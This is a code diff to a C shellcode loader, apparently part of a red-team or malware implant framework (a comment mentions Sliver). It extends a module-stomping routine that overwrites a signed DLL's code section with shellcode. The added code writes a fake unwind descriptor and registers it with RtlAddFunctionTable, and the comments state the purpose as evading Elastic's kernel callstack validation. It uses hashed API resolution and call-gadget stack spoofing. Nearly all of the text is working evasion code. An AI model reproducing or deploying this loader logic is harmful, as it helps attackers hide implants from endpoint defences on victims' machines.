@@ -80,10 +80,29 @@ PVOID GetRandomCallGadget(VOID) {
 }
 
 // -----------------------------------------------
+// Synthetic RUNTIME_FUNCTION registered with
+// RtlAddFunctionTable after stomping. The kernel
+// stores the pointer — it must have static lifetime.
+//
+// Elastic 8.11+ kernel ETW callstack validation flags
+// frames whose RIP falls inside executable memory with
+// no matching RUNTIME_FUNCTION entry. Registering a
+// minimum-viable unwind descriptor for the stomped
+// region makes RtlLookupFunctionEntry(rip) return a
+// valid handle, satisfying the check. Accurate unwind
+// isn't required — the stackwalker treats our region
+// as a leaf function and walks past it to the (real)
+// caller frame injected by the call-gadget spoof.
+// -----------------------------------------------
+static RUNTIME_FUNCTION g_StompRuntimeFunc = { 0 };
+
+// -----------------------------------------------
 // Module Stomping
 // Loads a sacrificial DLL and overwrites its
 // executable section with shellcode, so the
 // shellcode memory is attributed to a signed DLL.
+// After the overwrite, registers a synthetic
+// RUNTIME_FUNCTION for the shellcode region.
 //
 // Memory protection is controlled by SHELLCODE_EXEC_PROT:
 //   RWX_SHELLCODE defined:   PAGE_EXECUTE_READWRITE (Go/Sliver)
@@ -134,9 +153,18 @@ BOOL ModuleStomp(
         return FALSE;
     }
 
-    // Change protection to RW for writing
+    // Reserve 4 bytes (DWORD-aligned) after shellcode for minimum UNWIND_INFO
+    DWORD dwUnwindOffset = (dwShellcodeSize + 3) & ~3u;
+    DWORD dwWriteSize    = dwShellcodeSize;
+    BOOL  bHasUnwindSlot = FALSE;
+    if (dwTextSize >= dwUnwindOffset + sizeof(DWORD)) {
+        dwWriteSize    = dwUnwindOffset + sizeof(DWORD);
+        bHasUnwindSlot = TRUE;
+    }
+
+    // Change protection to RW for writing (covers shellcode + unwind slot)
     DWORD dwOldProtect = 0;
-    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwShellcodeSize, PAGE_READWRITE, &dwOldProtect)) {
+    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwWriteSize, PAGE_READWRITE, &dwOldProtect)) {
         LOG("[!] Module stomp: VirtualProtect(RW) failed");
         return FALSE;
     }
@@ -144,11 +172,40 @@ BOOL ModuleStomp(
     // Overwrite .text with shellcode
     MemCopy(pTextBase, pShellcode, dwShellcodeSize);
 
+    // Write minimum UNWIND_INFO (4 bytes): version=1, flags=0, prolog=0,
+    // unwind-code-count=0, frame-register=0, frame-offset=0. Describes a
+    // leaf function with no prologue — stackwalker will pop the return
+    // address and continue to the caller frame without error.
+    PBYTE pUnwindInfo = NULL;
+    if (bHasUnwindSlot) {
+        pUnwindInfo = (PBYTE)pTextBase + dwUnwindOffset;
+        pUnwindInfo[0] = 0x01;  // Version (3 bits) + Flags (5 bits)
+        pUnwindInfo[1] = 0x00;  // SizeOfProlog
+        pUnwindInfo[2] = 0x00;  // CountOfUnwindCodes
+        pUnwindInfo[3] = 0x00;  // FrameRegister (4 bits) + FrameOffset (4 bits)
+    }
+
     // Set final execution protection (RX or RWX depending on build config)
     DWORD dwDummy = 0;
-    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwShellcodeSize, SHELLCODE_EXEC_PROT, &dwDummy)) {
+    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwWriteSize, SHELLCODE_EXEC_PROT, &dwDummy)) {
         LOG("[!] Module stomp: VirtualProtect(exec) failed");
         return FALSE;
+    }
+
+    // Register synthetic RUNTIME_FUNCTION so RtlLookupFunctionEntry(rip)
+    // succeeds for the stomped region. Best-effort — stomp itself is
+    // successful either way.
+    if (bHasUnwindSlot) {
+        typedef BOOLEAN(NTAPI * fnRtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);
+        fnRtlAddFunctionTable pAdd = (fnRtlAddFunctionTable)FetchExportAddress(
+            FindLoadedModuleW(L"NTDLL.DLL"), RtlAddFunctionTable_JOAAT
+        );
+        if (pAdd) {
+            g_StompRuntimeFunc.BeginAddress = (DWORD)((ULONG_PTR)pTextBase - (ULONG_PTR)hModule);
+            g_StompRuntimeFunc.EndAddress   = g_StompRuntimeFunc.BeginAddress + dwShellcodeSize;
+            g_StompRuntimeFunc.UnwindData   = (DWORD)((ULONG_PTR)pUnwindInfo - (ULONG_PTR)hModule);
+            pAdd(&g_StompRuntimeFunc, 1, (DWORD64)hModule);
+        }
     }
 
     *ppExecAddr = pTextBase;
